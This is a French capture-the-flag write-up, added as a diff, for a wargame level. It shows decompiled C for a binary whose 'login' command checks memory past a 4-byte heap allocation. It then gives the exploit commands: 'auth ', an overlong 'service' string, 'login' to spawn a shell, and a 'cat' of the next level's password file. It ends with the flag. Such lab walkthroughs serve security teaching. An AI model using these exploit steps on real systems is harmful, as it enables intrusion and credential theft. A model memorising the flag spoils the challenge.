@@ -1,0 +1,83 @@
+# Level 8
+
+## Code décompilé
+
+```c
+int main(void)
+{
+  while (1)
+  {
+    printf("%p, %p \n", auth, service);
+    if (!fgets(s, 128, stdin))
+      break;
+    if (!memcmp(s, "auth ", 5u))
+    {
+      auth = malloc(4u);
+      *(_DWORD *)auth = 0;
+      if (strlen(v5) <= 0x1E)
+        strcpy(auth, v5);
+    }
+    if (!memcmp(s, "reset", 5u))
+      free(auth);
+    if (!memcmp(s, "service", 6u))
+      service = strdup(v6);
+    if (!memcmp(s, "login", 5u))
+    {
+      if (*((_DWORD *)auth + 8))
+        system("/bin/sh");
+      else
+        fwrite("Password:\n", 1u, 0xAu, stdout);
+    }
+  }
+  return 0;
+}
+```
+
+## Analyse du binaire
+
+Le programme implémente un système simple de commandes :
+
+- `auth` : alloue 4 octets de mémoire
+- `service` : utilise strdup pour copier une chaîne
+- `login` : vérifie la valeur à auth + 32 pour donner un shell
+- `reset` : libère la mémoire de auth
+
+## Vulnérabilité
+
+La vulnérabilité réside dans le fait que :
+
+1. `auth` alloue seulement 4 octets
+2. Le programme vérifie une valeur à `auth + 32` (bien au-delà de la zone allouée)
+3. `service` avec `strdup` peut écrire dans cette zone non allouée
+
+## Exploitation
+
+1. Initialiser auth :
+(avec un espace)
+```bash
+'auth '
+```
+
+2. Utiliser service avec une longue chaîne pour écrire au-delà de auth :
+
+```bash
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+
+3. Utiliser login pour obtenir le shell :
+
+```bash
+login
+```
+
+4. Lire le flag :
+
+```bash
+cat /home/user/level9/.pass
+```
+
+## Flag
+
+```
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
